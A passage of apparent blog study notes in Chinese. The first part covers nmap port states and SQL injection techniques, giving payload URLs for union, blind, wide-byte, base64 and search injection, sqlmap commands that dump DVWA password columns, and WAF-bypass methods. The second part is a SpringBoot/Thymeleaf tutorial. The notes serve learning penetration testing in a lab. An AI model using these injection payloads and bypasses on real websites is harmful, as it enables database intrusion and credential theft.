开放状态，而filtered的端口直接就没就没能够被nmap访问。端口被定义为Unfilterd只会发生在 TCP ack扫描类型时当返回RST的报文。而端口被定义为filtered 状态的原因是是报文被防火墙设备 ，路由器规则，或者防火墙软件拦截，无法送达到端口，这通常表现为发送NMAP的主机收到ICMP 报错报文，如：TYPE为3，code为13的报文（通信被认为的禁止communication administratively prohibited），或者主机通过多次重复发送没有收到任何回应） Open|filtered状态 : 这种状态主要是nmap无法区别端口处于open状态还是filtered状态。这种 状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin ，和xmas扫描类型。 Closed|filtered状态 : 这种状态主要出现在nmap无法区分端口处于closed还是filtered时。此状态 只会出现在IP ID idle scan（这个类型我现在也不太理解，需要再进行补充）中。 masscan端口扫描器masscan号称是世界上最快的扫描软件，可以在3分钟内扫描整个互联网端口， 但是这个是由条件的4核电脑，双端口10G网卡。 • masscan相比nmap之所以快很多，masscan采用了异步传输方式，无状态的扫 描方式。nmap需要记录tcp/ip的状态，os能够处理的TCP/IP连接最多为1500左 右。 sql注入1.原理 SQL注入(SQL Injection) 即是指web应用程序对用户输入数据的合法性没有判断或过滤 不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在 管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询， 从而进一步得到相应的数据信息。 • 总结： • 1、是一种将SQL语句插入或添加到应用(用户)的输入参数中的攻击; • 2、这些参数传递给后台的SQL数据库服务器加以解析并执行; 2.危害• 绕过登录验证：使用万能密码登录网站后台等。 • 获取敏感数据：获取网站管理员帐号、密码等。 • 文件系统操作：列目录，读取、写入文件等。 • 注册表操作：读取、写入、删除注册表等。 • 执行系统命令：远程执行命令 3.成因成因可以归结为以下两个原因叠加造成的： • 1、 程序编写者在处理程序和数据库交互时，使用字符串拼接的方式构造 SQL语句 ； • 2、 未对用户可控参数进行足够的过滤便将参数内容拼接进入到SQL语句中。 4.分类 5.sql注入测试的方法 1.注入点查找表单提交，主要是POST请求，也包括GET请求。 • URL参数提交，主要为GET请求参数。 • Cookie参数提交。 • HTTP请求头部可修改的值，比如: • Referer、User_Agent、X-forwarded-for 2.构造测试语句 6.手工注入-数字型&amp;字符型 总而言之，就是对SQL中的各种类型的输入进行闭合测试， 构造合法SQL，欺骗后台执行！ sql联合查询注入 判断列数 当N大于结果集的实际列数时，SQL语句会执行出错，此时SQL语句无法查询到数据，将导致页面显示异常； Ø 因此我们可以使用ORDER BY语句进行测试，通过逐一增加N的值，当页面显示异常时，可推测出结果集实际列数为N-1； 1.判断原有查询语句的列数 select company, ordernumber from orders order by 5 2.使原有查询语句的结果为空 http://localhost/sqleasy/news.php?newsid=-1 3.判断数据输出位置 http://localhost/sqleasy/news.php?newsid=-1 union select 1,2,3,4,5 4.使用union语句拼接目标数据的查询语句 http://127.0.0.1/sqltest/search.php?id=-1 union select 1,username,password,3,4, from admin &amp;firstname=&amp;lastname=&amp;city=&amp;year=&amp;btnSign=%E6%9F%A5%E8%AF%A 前提 报错注入1.前提利用前提： 页面上没有显示位，但是需要输出SQL语句执行错误信息。比如mysql_error() 优点： 不需要显示位 缺点： 需要输出mysql_error()的报错信 盲注1.原理盲注就是在sql注入过程中，sql语句执行select之后，可能由于网站代码的限制或者apache等 解析器配置了不回显数据，造成在select数据之后不能回显到前端页面。此时，我们需要利用一 些方法进行判断或者尝试，这个判断的过程称之为盲注 2.分类基于布尔SQL盲注 基于时间的SQL盲注 3.前提利用前提： 页面上没有显示位，也没有输出SQL语句执行错误信息。 只能通过页面返回正常不正常来注入 优点： 不需要显示位，不需要出错信息。 缺点： 速度慢，耗费大量时间。 4.基于布尔盲注1、没有报错信息 2、不管是正确的输入，还是错误的输入，都只显示两种情况 (我们可以认为是0或者1) 3、在正确的输入下，输入and 1=1/and 1=2看返回发现可以判断（只会有真假，没有报错） 5.时间盲注1.前提利用前提： 页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之 后， 页面的返回速度明显慢了5秒。 优点： 不需要显示位，不需要出错信息。 缺点: 速度慢，耗费大量时间。 2.原理时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上使用IF语句加入延时 语句来构造，由于时间型盲注耗时较大，通常利用脚本工具来执行，在手工利用的过程中较少使用 宽字节注入原理1.正常情况下，输入id=1，正常输出为1的信息 2.输入？id=1' 测试页面，发现输入1‘后被转移为\\' ，没有信息输出，因为单引号被转移为了\\'导致单引号被转移，所以没有闭合 3.输入？d=1%df'测试，丹壹号成功逃逸出转义，闭合成功 4.我们输入“ %df' ”，我们的输入经过 addslashes函数处理 就变成了“%df\\'------&gt;%df%5c%27”，在GBK编码的环境下 df 和 5c 会被自动转化成一个汉字“運” 因此语句就变成了（id='1\\'--+'---- &gt;id='1運' 5.输入: ?id=1 %df' union select database(),user(),3 --+ 获取数据库名和用户 addslashes()函数返回在预定义字符之前添加反斜杠的字符串预定义字符 • 单引号(') • 双引号(”) • 反斜杠(\\) • NULL %27---------单引号 %20---------空格 %23---------#号 %5c---------\\反斜杠 base64注入原理base64注入是针对于传递参数被base64加密后的注入点进行注入的 1.正常传参？id=MQ== 输入id=1的内容 2. 测试是否存在注入？id=MSBhbmQGMt0X ?id=msbhbmqgmt0y and 1=1 和and 1=2看页面变化，发现页面有变化，尝试union注入 3. 判断列数？id=msbvcm== 4.确定显示位 ？id=ltewehsfjs== 5.获取数据库名和用户名 sql注入-搜索型注入1.url输入：?name=k%' and 1=1--+ 页面有正常搜索信息输出 2.url输入：?name=k%' and 1=2 --+ 页面没有信息,说明and 后面代码成功被执行 3.url输入：?name=k%' order by 7 --+ 判断列数 4.url输入：?name=我%' union select 1,2,3 --+ 判断显示位 ,得出1,2,3 都是显示位 url输入：?name=我%' union select database(),user(),3 --+ 获取数据库名和用户名 sql注入-cookie注入原理cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提 交了，而一般的注入我们是使用get或者post方式提交。 sqlmap1.常见参数：1.设置目标url参数：-u /--url 最基本格式 sqlmap -u \"http: //www. target.com/index. php?id=1\" 参数：-m 从文本中获取多个目标扫描，但是每一行只能有一个url。 基本格式：sqlmap -m urllist. txt 参数：-r 从文件中加载HTTP请求，这样的话 就不需要在去设定cookie, POST数据...... 基本格式: sqlmap -r 1.txt 2.设置回显等级参数：-v 默认为1: 0、只显示python错误以及严重的信息。 1、 同时显示基本信息和警告信息。（默认等级） 2、 同时显示debug信息。 3、 同时显示注入的payload。 4、 同时显示HTTP请求。 5、 同时显示HTTP响应头。 6、 同时显示HTTP响应页 3.设置探测等级参数：--level (sqlmap -r 情况下) 共有五个等级，默认为1, sqlmap使用的payload可以在xml/payloads.xml中看 到，自己也可以根据相应的格式添加自己的payload level&gt;=2的时候就会测试HTTP Cookie level&gt;=3的时候就会测试HTTP User-Agent/Referer头 level=5的时候会测试HTTP Host 基本格式：sqlmap -r 1.txt --level= 4.设置HTTP数据包参数：参数：--data 此参数是把data后面的数据以POST方式提交，当参数是POST提交的时候,但是你有没有抓取 数据包,可以用URL+需要检查的参数。 基本格式：sqlmap -u \"http://www.target.com/vuln.php\" --data= \"id=1\" 参数：--cookie 当web需要登录的时候，需要我们抓包获取cookie参数，然后复制出来，加到--cookie参数 中。 基本格式：sqlmap -u \"http://www.target.com/vuln.php\" --data= \"id=1\" --cookie= \"Cookie: Hm_lvt6910067,1546929561,1547001094,1547024662;PHPSESSID=o64fbvo316lg59njufl2 gfutm4;\" HTTP User-Agents 参数：--user-agent 默认情况下sqlmap的HTTP请求头中的User-Agent值是：sqlmap/1.0-dev- xxxxxxxxx(http://sqlmap.org) 这个时候可以手动指定伪造一个User-Agent. 基本格式：sqlmap -u \"http://www.target.com\" --level 3 --user-agent= \"aaaaaa\" -dbs 参数：-random-agent 会从/usr/share/sqlmap/data/txt中随机产生User-Agent头。 基本格式：sqlmap -u \"http://www.target.com\" --level 3 -random-agent -dbs sqlmap检查uesr-agent中的注入点，level&gt;=3才会去检查user-agent头是否存在注入漏洞 HTTP Referer头 参数：-referer sqlmap可以在请求中伪造HTTP中的referer。当--level参数设定＞=3时,会尝试进行referer注 入。 基本格式： sqlmap -u \"http:/A/vww.target.com/?id=1\" --referer= \"http://www.baidu.com\" 参数：--delay 可以设定两个http请求间的延迟，设定为1的时候是1秒，默认是没有延迟的。 参数：--timeout 可以设定一个http请求超过多少秒判定为超时，默认是30秒 2.使用sqlmap获取dvwa数据（1）设置Brupsuite和浏览器代理； （2）拦截POST请求内容，并另存为url.txt,此处存放在/etc目录下 （3）判断注入点和数据库类型：root@kali:~# sqlmap -r /etc/url （4）判断数据库名：root@kali:~# （5）判断表名：root@kali:~# sqlmap -r /etc/url -D dvwa –tables （6）判断列名：root@kali:~# sqlmap -r /etc/url -D dvwa -T users –-column （7）获取user字段信息：root@kali:~# sqlmap -r /etc/url -D dvwa -T users （8）获取passwor字段信息：root@kali:~# sqlmap -r /etc/url -D dvwa -T users -C password –-dump （9）获取除系统默认表外的所有数据：root@kali:~# sqlmap -r /etc/url –dump-all –exclude-sysdbs sql绕过安全狗四种方法： 方法一：内链注释正常绕过 方法二：内联反向思维绕过 方法三：GET传参绕过：参数名=/&amp;正常参数&amp;参数名字=/ 方法四：url编码+16进制编码绕过","categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"SpringBoot","slug":"04-锋迷商城-随堂笔记/01-SpringBoot/SpringBoot","date":"2021-01-27T13:00:00.000Z","updated":"2021-11-25T19:15:38.468Z","comments":true,"path":"posts/9.html","link":"","permalink":"https://bigbug888.github.io/posts/9.html","excerpt":"","text":"一、项目整合与部署存在的问题1.1 SSM手动整合存在的问题 SSM整合步骤多、配置繁琐 项目进行服务器部署步骤繁琐 1.2 如何简化这些繁琐的配置和部署步骤？ SpringBoot就是一个可以简化整合过程中复杂配置的框架 二、SpringBoot简介2.1 概念 随着动态语言的流行，Java语言的开发就显得格外笨重：配置繁琐、开发效率低、项目的部署变得复杂、集成第三方技术难度大。 在这种情况下，SpringBoot就应运而生。 SpringBoot采用了习惯优于配置/约定大于配置的理念快速的搭建项目的开发环境，我们无需或者进行很少的相关spring配置就能够快速的将项目运行起来 2.2 优点 能够快速的搭建项目 对主流的开发框架都提供了无配置集成（SpringBoot内置了配置） 项目可以独立运行、无需单独配置Servlet容器（内置了Tomcat） 极大提高了开发、部署效率 提供了运行时监控系统（日志等） 与云原生有天然的集成 2.3 缺点 由于配置都是内置的，报错时定位比较困难 版本迭代速度比较快、有些版本改动还是比较大（增加学习成本） 三、第一个SpringBoot应用 体验：基于SpringBoot整合SpringMVC SpringBoot应用需要依赖远程服务器进行创建 远程服务器： Spring官方：https://start.spring.io ali：https://start.aliyun.com 3.1 创建项目3.1 File—New—Project 3.2 填写项目信息 3.3 选择项目依赖 3.4 选择项目存储目录 3.5 网页创建SpringBoot应用如果基于IDEA创建无法下载，可以基于网页版进行创建 3.2 配置项目3.2.1 应用项目结构 3.2.2 自定义配置(整合MyBatis) SpringBoot帮助我们完成通用性配置，但是像数据库连接地址、账号、密码等还是需要手动完成配置 修改mysql驱动的版本（选择性） 在SpringBoot主配置文件application.properties文件中配置数据源及路径 # 配置数据源 （key必须按照SpringBoot的要求） spring.datasource.driver-class-name=com.mysql.jdbc.Driver spring.datasource.url=jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 spring.datasource.username=root spring.datasource.password=admin123 # 配置映射文件路径及实体类的包名 mybatis.mapper-locations=classpath:mappers/*Mapper.xml mybatis.type-aliases-package=com.qfedu.springboot.demo.entity 在SpringBoot启动类通过@MapperScan注解指定DAO接口的包名 @SpringBootApplication @MapperScan(\"com.qfedu.springboot.demo.dao\") public class SpringbootDemo1Application { public static void main(String[] args) { SpringApplication.run(SpringbootDemo1Application.class, args); } } 3.3 启动项目3.3.1 启动 SpringBoot应用自带Servlet容器—Tomcat,因此无需进行额外的服务器配置，运行启动类即可启动一个SpringBoot应用 3.3.2 测试 用户的注册功能 四、SpringBoot原理4.1 starter 一个starter就是一个开发场景的支持（ 依赖 + 配置） SpringBoot为我们提供了简化企业级开发绝大多数场景的支持（提供了多个starter），我们在进行项目开发的过程中只需引入对应的starter（创建SpringBoot应用时可选择），相关的依赖和配置就会被内置到项目中（消除人工配置）。 4.1.1 starter依赖 一个starter依赖表示的不是一个依赖，而是某种开发环境所需的一组依赖 Spring Web — spring-boot-starter-web MyBatis Framework — mybatis-spring-boot-starter 4.1.2 starter配置 一个starter不仅包含所需依赖，还包含了其所需的对应的配置 MyBatis Framework — mybatis-spring-boot-starter 依赖： 配置： 4.1.3 案例 引入redis开发场景 添加starter依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt; &lt;/dependency&gt; 在service中可以直接注入redis客户端 @Service public class UserServiceImpl implements UserService { @Resource private UserDAO userDAO; @Resource private StringRedisTemplate stringRedisTemplate; } 4.2 SpringBoot应用的pom文件4.2.1 基于Spring官方服务器创建的SpringBoot应用 继承spring-boot-starter-parent.pom &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!-- SpringBoot应用中的pom 继承了spring-boot-starter-parent.pom --&gt; &lt;!-- spring-boot-starter-parent.pom又继承了spring-boot-dependencies.pom--&gt; &lt;!-- 在spring-boot-dependencies.pom已经对主流的框架的版本进行了声明 --&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.4.4&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;/project&gt; 引入了maven对springboot应用支持的插件 spring-boot &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;mainClass&gt;com.qfedu.springboot.demo.SpringbootDemo1Application&lt;/mainClass&gt; &lt;excludes&gt; &lt;exclude&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/exclude&gt; &lt;/excludes&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 4.2.2 基于ali服务器创建的SpringBoot应用&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.qfedu&lt;/groupId&gt; &lt;artifactId&gt;springboot-demo2&lt;/artifactId&gt; &lt;version&gt;1.0.0&lt;/version&gt; &lt;name&gt;springboot-demo2&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;project.reporting.outputEncoding&gt;UTF-8&lt;/project.reporting.outputEncoding&gt; &lt;!--SpringBoot引用的pom没有继承spring-boot-starter-parent.pom，因此版本需要在当前pom中进行定义 --&gt; &lt;spring-boot.version&gt;2.3.7.RELEASE&lt;/spring-boot.version&gt; &lt;/properties&gt; &lt;build&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;version&gt;2.3.7.RELEASE&lt;/version&gt; &lt;configuration&gt; &lt;mainClass&gt;com.qfedu.springboot.demo2.SpringbootDemo2Application&lt;/mainClass&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;repackage&lt;/id&gt; &lt;goals&gt; &lt;goal&gt;repackage&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; &lt;/project&gt; 4.3 Java配置方式 如果我们需要在SpringBoot应用中整合一种新的开发场景，只需在pom.xml引入对应的starter即可 一个starter不仅包含依赖，还包含相应的配置，starter中包含的配置都是通过Java类实现的——Java配置方式 4.3.1 Spring版本发展 随着Spring版本的迭代，配置方式也在发生变化 Spring 1.x 所有的bean的配置只能通过xml完成 Spring 2.x 基于JDK1.5对注解的支持，Spring 2.x开始支持注解 企业开发中到底是用xml配置还是用注解？ 对基础配置、引用的第三方依赖中的配置使用xml完成：例如数据源配置 业务开发使用注解：例如controller、service Spring 3.x Spring 开始提供基于Java的配置方式 Spring 4.x xml、注解、Java 4.3.2 xml配置&lt;!--applicationContext.xml--&gt; &lt;bean id=\"stu\" class=\"com.qfedu.beans.Student\"&gt;&lt;/bean&gt; &lt;bean id=\"date\" class=\"java.util.Date\"&gt;&lt;/bean&gt; 4.3.3 注解配置@Component public class Student{ } 4.3.4 Java配置方式 创建配置类 @Configuration public class SpringConfig{ @Bean public Date getDate(){ return new Date(); } } 4.4 SpringBoot自动配置 4.5 全局配置文件 SpringBoot针对不同的开发场景提供默认的属性配置，如果默认的配置不能满足开发的需要，我们需要对属性配置进行修改 SpringBoot应用提供了一个全局配置文件application.properties用于进行自定义配置 全局配置文件支持2中语法配置： properties 键值对配置 yaml 语法的配置 4.5.1 基于properties配置# 配置数据源 （key必须按照SpringBoot的要求） spring.datasource.driver-class-name=com.mysql.jdbc.Driver spring.datasource.url=jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 spring.datasource.username=root spring.datasource.password=admin123 # 配置映射文件路径及实体类的包名 mybatis.mapper-locations=classpath:mappers/*Mapper.xml mybatis.type-aliases-package=com.qfedu.springboot.demo.entity 4.5.2 基于yaml配置spring: datasource: url: jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 driver-class-name: com.mysql.jdbc.Driver username: root password: admin123 mybatis: mapper-locations: classpath:mappers/*Mapper.xml type-aliases-package: com.qfedu.springboot.demo.entity 4.5.3 常用的全局配置server: port: 9999 servlet: context-path: /demo1 4.6 自定义Banner 在SpringBoot应用启动的时候是有一个默认启动图案的 这个默认图案支持自定义配置 在resources目录创建一个banner.txt 在banner.txt文件中定义图案 http://patorjk.com/software/taag/ 佛祖保佑 //////////////////////////////////////////////////////////////////// // _ooOoo_ // // o8888888o // // 88\" . \"88 // // (| ^_^ |) // // O\\ = /O // // ____/`---'\\____ // // .' \\\\| |// `. // // / \\\\||| : |||// \\ // // / _||||| -:- |||||- \\ // // | | \\\\\\ - /// | | // // | \\_| ''\\---/'' | | // // \\ .-\\__ `-` ___/-. / // // ___`. .' /--.--\\ `. . ___ // // .\"\" '&lt; `.___\\_&lt;|&gt;_/___.' &gt;'\"\". // // | | : `- \\`.;`\\ _ /`;.`/ - ` : | | // // \\ \\ `-. \\_ __\\ /__ _/ .-` / / // // ========`-.____`-.___\\_____/___.-`____.-'======== // // `=---=' // // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ // // 佛祖保佑 永不宕机 永无BUG // //////////////////////////////////////////////////////////////////// 五、SpringBoot整合JSP SpringBoot应用默认支持的动态网页技术是Thymeleaf，并不支持JSP；因此在SpringBoot应用想要使用JSP需要通过手动整合来实现 5.1 添加依赖&lt;dependency&gt; &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt; &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt; &lt;version&gt;9.0.45&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;/dependency&gt; 5.2 创建JSP页面 修改pom文件打包方式为war 在main中创建webapp目录 在webapp创建.jsp页面 5.3 将JSP页面放在WEB-INF中的访问 将JSP文件存放到WEB-INF目录 在application.yml文件配置SpringMVC视图解析方式： spring: mvc: view: prefix: /WEB-INF/ suffix: .jsp 创建PageController @Controller public class PageController { @RequestMapping(\"/index.html\") public String index() { return \"index\"; } } 六、基于SpringBoot的SSM整合6.1 创建Springboot项目 创建项目时添加依赖 lombok spring web mysql driver mybatis framework 修改mysql驱动的版本（可选） &lt;!--pom.xml--&gt; &lt;properties&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;mysql.version&gt;5.1.47&lt;/mysql.version&gt; &lt;/properties&gt; 6.2 进行MyBatis所需的配置 将默认创建的application.properties后缀名修改为yml(根据习惯可选) 完成MyBatis的自定义配置 spring: datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 username: root password: admin123 mybatis: type-aliases-package: com.qfedu.springboot.ssm.beans mapper-locations: classpath:mappers/*Mapper.xml 6.3 在启动类配置DAO扫描 @MapperScan @SpringBootApplication @MapperScan(\"com.qfedu.springboot.ssm.dao\") public class SpringbootSsmApplication { public static void main(String[] args) { SpringApplication.run(SpringbootSsmApplication.class, args); } } 6.4 整合Druid连接池 在SpringBoot中整合MyBatis的时候，默认集成了Hikari连接池，Hikari的效率比Druid要高，但是得益于Druid提供了比较便捷的监控系统在企业开发中，druid使用还是最多的。 6.4.1 添加druid的starter&lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; 6.4.2 配置druid数据源spring: datasource: druid: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/db_2010_mybatis?characterEncoding=utf-8 username: root password: admin123 initial-size: 1 min-idle: 1 max-active: 20 七、Thymeleaf Thymeleaf是一种类似于JSP的动态网页技术 7.1 Thymeleaf简介 JSP 必须依赖Tomcat运行，不能直接运行在浏览器中 HTML可以直接运行在浏览器中，但是不能接收控制器传递的数据 Thymeleaf是一种既保留了HTML的后缀能够直接在浏览器运行的能力、又实现了JSP显示动态数据的功能——静能查看页面效果、动则可以显示数据 7.2 Thymeleaf的使用 SpringBoot应用对Thymeleaf提供了良好的支持 7.2.1 添加thymeleaf的starter&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; 7.2.2 创建Thymeleaf模板 Thymeleaf模板就是HTML文件 SpringBoot应用中 resources\\templates目录就是用来存放页面模板的 重要说明： static 目录下的资源被定义静态资源，SpringBoot应用默认放行；如果将HTML页面创建static目录是可以直接访问的 templates 目录下的文件会被定义为动态网页模板，SpringBoot应用会拦截templates中定义的资源；如果将HTML文件定义在templates目录，则必须通过控制器跳转访问。 在templates创建HTML页面模板 创建PageController，用于转发允许”直接访问”的页面请求 @Controller @RequestMapping(\"/page\") public class PageController { @RequestMapping(\"/test.html\") public String test(){ return \"test\"; } } 7.3 Thymeleaf基本语法 如果要在thymeleaf模板中获取从控制传递的数据，需要使用th标签 7.3.1 在thymeleaf模板页面引入th标签的命名空间&lt;!DOCTYPE html&gt; &lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; 7.3.2 th:text 在几乎所有的HTML双标签都可以使用 th:text属性，将接收到的数据显示在标签的内容中 &lt;label th:text=\"${price}\"&gt;&lt;/label&gt; &lt;div th:text=\"${str}\"&gt;&lt;/div&gt; &lt;p th:text=\"${book.bookName}\"&gt;&lt;/p&gt; 7.3.3 th:inline 内联 HTML内联 &lt;p th:inline=\"text\"&gt;图书名称：[[${book.bookName}]]&lt;/p&gt; CSS内联 &lt;style type=\"text/css\" th:inline=\"css\"&gt; .style1{ color:[[${color}]] } &lt;/style&gt; JavaScript内联 &lt;script type=\"css/javascript\" th:inline=\"javascript\"&gt; &lt;/script&gt; 7.3.4 th:object 和 *&lt;div th:object=\"${book}\"&gt; &lt;p th:text=\"*{bookId}\"&gt;&lt;/p&gt; &lt;p th:text=\"*{bookName}\"&gt;&lt;/p&gt; &lt;p th:text=\"*{bookAuthor}\"&gt;&lt;/p&gt; &lt;/div&gt; 7.4 流程控制7.4.1 th:each 循环&lt;table style=\"width: 600px\" border=\"1\" cellspacing=\"0\"&gt; &lt;caption&gt;图书信息列表&lt;/caption&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;图书ID&lt;/th&gt; &lt;th&gt;图书名称&lt;/th&gt; &lt;th&gt;作者&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr th:each=\"b:${books}\"&gt; &lt;td th:text=\"${b.bookId}\"&gt;&lt;/td&gt; &lt;td th:text=\"${b.bookName}\"&gt;&lt;/td&gt; &lt;td th:text=\"${b.bookAuthor}\"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; 7.4.2 分支 th:if 如果条件不成立，则不显示此标签 &lt;td th:if=\"${b.bookPrice}&gt;40\" style=\"color:red\"&gt;太贵！！！&lt;/td&gt; &lt;td th:unless=\"${b.bookPrice}&gt;40\" style=\"color:red\"&gt;太贵！！！&lt;/td&gt; &lt;td th:if=\"${b.bookPrice}&lt;=40\" style=\"color:green\"&gt;推荐购买&lt;/td&gt; th:switch 和 th:case &lt;td th:switch=\"${b.bookPrice}/10\"&gt; &lt;label th:case=\"3\"&gt;建议购买&lt;/label&gt; &lt;label th:case=\"4\"&gt;价格合理&lt;/label&gt; &lt;label th:case=\"*\"&gt;价格不合理&lt;/label&gt; &lt;/td&gt; &lt;td th:switch=\"${user.gender}\"&gt; &lt;label th:case=\"M\"&gt;男&lt;/label&gt; &lt;label th:case=\"F\"&gt;女&lt;/label&gt; &lt;label th:case=\"*\"&gt;性别不详&lt;/label&gt; &lt;/td&gt; 7.5 碎片使用7.5.1 碎片的概念 碎片，就是HTML片段，我们可以将多个页面中使用的相同的HTML标签部分单独定义，然后通过th:include可以在HTML网页中引入定义的碎片 7.5.2 碎片使用案例 定义碎片 th:fragment header.html &lt;!DOCTYPE html&gt; &lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div th:fragment=\"fragment1\" style=\"width: 100%; height: 80px;background: deepskyblue; color:white; font-size: 25px; font-family:文鼎霹雳体\"&gt; 千锋武汉Java2010班，六六六！！！ &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; footer.html &lt;!DOCTYPE html&gt; &lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div th:fragment=\"fragment2\" style=\"width: 100%; height: 30px;background: lightgray; color:white; font-size: 16px;\"&gt; 千锋教育 武汉校区 &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 引用碎片 th:include 和 th:replace a.html &lt;!DOCTYPE html&gt; &lt;html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- &lt;div th:include=\"header::fragment1\"&gt;&lt;/div&gt;--&gt; &lt;div th:replace=\"header::fragment1\"&gt;&lt;/div&gt; &lt;div style=\"width: 100%; height: 500px\"&gt; 定义内容 &lt;/div&gt; &lt;!-- &lt;div th:include=\"footer::fragment2\"&gt;&lt;/div&gt;--&gt; &lt;div th:replace=\"footer::fragment2\"&gt;&lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 八、SpringBoot应用的热部署配置8.1 热部署项目首次部署、服务启动之后，如果应用发生了变化、而且IDEA感知到了应用的变化，就自动的完成jar的更新，无需手动再次启动服务器，就可以访问应用的更新。 8.2 热部署配置8.2.1 IDE配置（idea） File—settings Ctrl+Shift+Alt+/ —– Registry 8.2.2 SpringBoot项目配置 在需要进行热部署的SpringBoot应用中添加依赖 &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;/dependency&gt; 配置SpringBoot的Maven插件 &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;configuration&gt; &lt;fork&gt;true&lt;/fork&gt; &lt;/configuration&gt; &lt;/plugin&gt; 